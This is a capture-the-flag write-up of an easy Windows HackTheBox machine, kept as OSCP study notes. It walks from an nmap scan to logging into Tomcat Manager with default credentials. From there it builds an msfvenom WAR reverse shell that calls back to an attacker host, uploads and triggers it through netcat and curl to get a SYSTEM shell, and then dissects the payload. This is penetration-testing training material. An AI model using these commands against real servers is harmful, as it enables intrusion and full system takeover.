## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)
## 🧭 Recon

### 🔍 Full TCP Port Scan
```bash
nmap -sT -p- --min-rate 5000 10.10.10.95
```
- Only port **8080** is open.

### 🔍 Version Detection
```bash
nmap -sV -sC -p 8080 -oA nmap/initial 10.10.10.95
```
- Port 8080 runs [Tomcat](HTTP): `Apache Tomcat/Coyote JSP engine 1.1`.

---

## 🌐 [Web Discovery](HTTP)

### 🔑 Tomcat Manager Login
- Navigate to `http://10.10.10.95:8080`
- Default credentials work:
  ```text
  Username: tomcat
  Password: s3cret
  ```

- This provides access to the **Tomcat Manager Application**, including a WAR deployment section.

---

## 💣 Exploitation via WAR Upload

### ⚙️ Create Malicious WAR Reverse Shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.XX LPORT=9002 -f war > rev_shell.war
```

### 🧪 Discover JSP Payload Name
```bash
jar -tf rev_shell.war
# Output includes: ppaejmsg.jsp
```

### 🛜 Serve WAR File
Upload via Tomcat Manager at:  
➡️ `http://10.10.10.95:8080/manager/html`

### 📡 Trigger Reverse Shell
On attacker:
```bash
nc -lnvp 9002
```

On target:
```bash
curl http://10.10.10.95:8080/rev_shell/ppaejmsg.jsp
```

Shell received:
```bash
whoami
# nt authority\system
```

---

## 🏁 Flags

```bash
cd C:\Users\Administrator\Desktop\flags
type 2\ for\ the\ price\ of\ 1.txt
```

**🎯 Output:**
```
user.txt: 7004dbce...
root.txt: 04a8b36e...
```

---

## 🔍 Beyond Root – War File Analysis

### 📦 WAR = ZIP
```bash
unzip -l rev_shell.war
```

### 🧾 Key Contents:
- `WEB-INF/web.xml`: servlet definition
- `ppaejmsg.jsp`: main reverse shell payload

### 🧠 JSP Breakdown:
- Hex-encoded executable written to disk
- Executed via `Runtime.getRuntime().exec()`
- On Linux: chmod +x before execution
- On Windows: just run `.exe`

### 🔄 Reverse Engineering the Binary
```bash
cat hex | xxd -r -p > rev_shell.exe
```

### 🧪 Test via Wine + tcpdump
```bash
wine rev_shell.exe
tcpdump -i any port 9002
```

Confirmed reverse shell behavior with **exponential backoff retry pattern**.

---

## ✅ Summary

| Phase               | Achievement                              |
|--------------------|-------------------------------------------|
| Recon              | Found Tomcat on port 8080                 |
| Exploit            | Gained SYSTEM shell via WAR upload        |
| User Flag          | Retrieved from Administrator desktop      |
| Root Flag          | Included in same text file as user        |
| Analysis           | Decompiled and verified WAR structure     |
